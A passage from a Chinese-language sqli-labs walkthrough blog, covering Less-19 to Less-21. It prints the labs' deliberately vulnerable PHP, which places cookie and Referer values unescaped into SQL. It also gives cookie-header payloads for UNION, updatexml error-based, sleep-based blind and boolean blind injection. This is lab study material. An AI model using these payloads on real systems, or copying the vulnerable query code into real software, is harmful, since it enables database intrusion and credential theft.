class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;../sql-connections/sql-connect.php&quot;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span>(<span class="params">$value</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($value))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// truncation (see comments)</span></span><br><span class="line">$value = substr($value,<span class="number">0</span>,<span class="number">20</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line"><span class="keyword">if</span> (get_magic_quotes_gpc())</span><br><span class="line">    &#123;</span><br><span class="line">    $value = stripslashes($value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Quote if not a number</span></span><br><span class="line"><span class="keyword">if</span> (!ctype_digit($value))</span><br><span class="line">    &#123;</span><br><span class="line">    $value = <span class="string">&quot;&#x27;&quot;</span> . mysql_real_escape_string($value) . <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">    $value = intval($value);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">return</span> $value;</span><br><span class="line">&#125;</span><br><span class="line">$uagent = $_SERVER[<span class="string">&#x27;HTTP_REFERER&#x27;</span>];</span><br><span class="line">$IP = $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Your IP ADDRESS is: &#x27;</span> .$IP;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment">// take the variables</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;uname&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">&#x27;passwd&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">$uname = check_input($_POST[<span class="string">&#x27;uname&#x27;</span>]);</span><br><span class="line">$passwd = check_input($_POST[<span class="string">&#x27;passwd&#x27;</span>]);</span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line">$fp=fopen(<span class="string">&#x27;result.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">fwrite($fp,<span class="string">&#x27;Referer:&#x27;</span>.$uname.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">fclose($fp);</span><br><span class="line">$sql=<span class="string">&quot;SELECT  users.username, users.password FROM users WHERE users.username=<span class="subst">$uname</span> and users.password=<span class="subst">$passwd</span> ORDER BY users.id DESC LIMIT 0,1&quot;</span>;</span><br><span class="line">$result1 = mysql_query($sql);</span><br><span class="line">$row1 = mysql_fetch_array($result1);</span><br><span class="line"><span class="keyword">if</span>($row1)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#x27;</span>;</span><br><span class="line">    $insert=<span class="string">&quot;INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES (&#x27;<span class="subst">$uagent</span>&#x27;, &#x27;<span class="subst">$IP</span>&#x27;)&quot;</span>;</span><br><span class="line">    mysql_query($insert);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your Referer is: &#x27;</span> .$uagent;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    print_r(mysql_error());</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/flag.jpg&quot; /&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#x27;</span>;</span><br><span class="line">    print_r(mysql_error());</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/slap.jpg&quot;  /&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h2><p>这个就是Cookie注入了，sql语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> username=<span class="string">&#x27;$cookee&#x27;</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure><p>先登陆进去发现Cookie字段增加了uname,直接联合查询</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Cookie</span>: uname=adsadas&#x27; union select 1,2,database()%23</span><br></pre></td></tr></table></figure><img src="/2019/10/17/sqli-labs-wp/TIM截图20200513235346.png" style="zoom:67%;"><p>报错注入：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Cookie</span>: uname=asddasd&#x27; or updatexml(1,concat(0x3a,(select user())),1)%23</span><br></pre></td></tr></table></figure><p>时间盲注：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Cookie</span>: uname=adsadas&#x27; or if(substr((select database()),1,1)=&#x27;s&#x27;,sleep(3),0)%23</span><br></pre></td></tr></table></figure><p>布尔盲注：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Cookie</span>: uname=adsadas&#x27; or substr((select database()),1,1)=&#x27;s&#x27;%23</span><br></pre></td></tr></table></figure><h3 id="关键代码-19"><a href="#关键代码-19" class="headerlink" title="关键代码"></a>关键代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;../sql-connections/sql-connect.php&quot;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_COOKIE[<span class="string">&#x27;uname&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&quot;../sql-connections/sql-connect.php&quot;</span>);</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">check_input</span>(<span class="params">$value</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($value))</span><br><span class="line">            &#123;</span><br><span class="line">                $value = substr($value,<span class="number">0</span>,<span class="number">20</span>); <span class="comment">// truncation (see comments)</span></span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">if</span> (get_magic_quotes_gpc())  <span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line">            &#123;</span><br><span class="line">                $value = stripslashes($value);</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">if</span> (!ctype_digit($value))       <span class="comment">// Quote if not a number</span></span><br><span class="line">            &#123;</span><br><span class="line">                $value = <span class="string">&quot;&#x27;&quot;</span> . mysql_real_escape_string($value) . <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                $value = intval($value);</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">return</span> $value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;uname&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">&#x27;passwd&#x27;</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        $uname = check_input($_POST[<span class="string">&#x27;uname&#x27;</span>]);</span><br><span class="line">        $passwd = check_input($_POST[<span class="string">&#x27;passwd&#x27;</span>]);</span><br><span class="line">        $sql=<span class="string">&quot;SELECT  users.username, users.password FROM users WHERE users.username=<span class="subst">$uname</span> and users.password=<span class="subst">$passwd</span> ORDER BY users.id DESC LIMIT 0,1&quot;</span>;</span><br><span class="line">        $result1 = mysql_query($sql);</span><br><span class="line">        $row1 = mysql_fetch_array($result1);</span><br><span class="line">        $cookee = $row1[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>($row1)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#x27;</span>;</span><br><span class="line">                setcookie(<span class="string">&#x27;uname&#x27;</span>, $cookee, time()+<span class="number">3600</span>);</span><br><span class="line">                header (<span class="string">&#x27;Location: index.php&#x27;</span>);</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;I LOVE YOU COOKIES&quot;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;&#x27;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">                print_r(mysql_error());</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/flag.jpg&quot; /&gt;&#x27;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#x27;</span>;</span><br><span class="line">                <span class="comment">//echo &quot;Try again looser&quot;;</span></span><br><span class="line">                print_r(mysql_error());</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/slap.jpg&quot; /&gt;&#x27;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>]))</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        $cookee = $_COOKIE[<span class="string">&#x27;uname&#x27;</span>];</span><br><span class="line">        $format = <span class="string">&#x27;D d M Y - H:i:s&#x27;</span>;</span><br><span class="line">        $timestamp = time() + <span class="number">3600</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;center&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&lt;br&gt;&lt;br&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/Less-20.jpg&quot; /&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;&lt;b&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&lt;font color= &quot;red&quot; font size=&quot;4&quot;&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;YOUR USER AGENT IS : &quot;</span>.$_SERVER[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;cyan&quot; font size=&quot;4&quot;&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;YOUR IP ADDRESS IS : &quot;</span>.$_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 4 &gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIRE &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;orange&quot; font size = 5 &gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;YOUR COOKIE : uname = <span class="subst">$cookee</span> and expires: &quot;</span> . date($format, $timestamp);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;/font&gt;&quot;</span>;</span><br><span class="line">        $sql=<span class="string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="subst">$cookee</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line">        $result=mysql_query($sql);</span><br><span class="line">        <span class="keyword">if</span> (!$result)</span><br><span class="line">                &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;Issue with your mysql: &#x27;</span> . mysql_error());</span><br><span class="line">                &#125;</span><br><span class="line">        $row = mysql_fetch_array($result);</span><br><span class="line">        <span class="keyword">if</span>($row)</span><br><span class="line">                &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;pink&quot; font size=&quot;5&quot;&gt;&#x27;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;Your Login name:&#x27;</span>. $row[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;grey&quot; font size=&quot;5&quot;&gt;&#x27;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;Your Password:&#x27;</span> .$row[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&lt;/b&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;Your ID:&#x27;</span> .$row[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">                &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;center&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&lt;br&gt;&lt;br&gt;&#x27;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/slap1.jpg&quot; /&gt;&#x27;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;&lt;b&gt;&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;input  type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Delete Your Cookie!&quot; /&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;/form&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;/center&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 6 &gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot; Your Cookie is deleted&quot;</span>;</span><br><span class="line">        setcookie(<span class="string">&#x27;uname&#x27;</span>, $row1[<span class="string">&#x27;username&#x27;</span>], time()<span class="number">-3600</span>);</span><br><span class="line">        header (<span class="string">&#x27;Location: index.php&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;/font&gt;&lt;/center&gt;&lt;/br&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">fwrite($fp,<span class="string">&#x27;Cookie:&#x27;</span>.$cookee.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">fclose($fp);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Less-21"><a href="#Less-21" class="headerlink" title="Less-21"></a>Less-21</h2><p>这个和上面的没啥差别，只不过将uname base64加密了</p><h3 id="关键代码-20"><a href="#关键代码-20" class="headerlink" title="关键代码"></a>关键代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;../sql-connections/sql-connect.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_COOKIE[<span class="string">&#x27;uname&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&quot;../sql-connections/sql-connect.php&quot;</span>);</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">check_input</span>(<span class="params">$value</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($value))</span><br><span class="line">    &#123;</span><br><span class="line">        $value = substr($value,<span class="number">0</span>,<span class="number">20</span>); <span class="comment">// truncation (see comments)</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (get_magic_quotes_gpc())  <span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line">    &#123;</span><br><span class="line">        $value = stripslashes($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!ctype_digit($value))       <span class="comment">// Quote if not a number</span></span><br><span class="line">    &#123;</span><br><span class="line">        $value = <span class="string">&quot;&#x27;&quot;</span> . mysql_real_escape_string($value) . <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        $value = intval($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;uname&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">&#x27;passwd&#x27;</span>]))</span><br><span class="line">        &#123;</span><br><span class="line">        $uname = check_input($_POST[<span class="string">&#x27;uname&#x27;</span>]);</span><br><span class="line">        $passwd = check_input($_POST[<span class="string">&#x27;passwd&#x27;</span>]);</span><br><span class="line">        $sql=<span class="string">&quot;SELECT  users.username, users.password FROM users WHERE users.username=<span class="subst">$uname</span> and users.password=<span class="subst">$passwd</span> ORDER BY users.id DESC LIMIT 0,1&quot;</span>;</span><br><span class="line">        $result1 = mysql_query($sql);</span><br><span class="line">        $row1 = mysql_fetch_array($result1);</span><br><span class="line">        <span class="keyword">if</span>($row1)</span><br><span class="line">                &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#x27;</span>;</span><br><span class="line">                setcookie(<span class="string">&#x27;uname&#x27;</span>, base64_encode($row1[<span class="string">&#x27;username&#x27;</span>]), time()+<span class="number">3600</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;I LOVE YOU COOKIES&quot;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;&#x27;</span>;</span><br><span class="line">                <span class="comment">//echo &#x27;Your Cookie is: &#x27; .$cookee;</span></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">                print_r(mysql_error());</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/flag.jpg&quot; /&gt;&#x27;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span 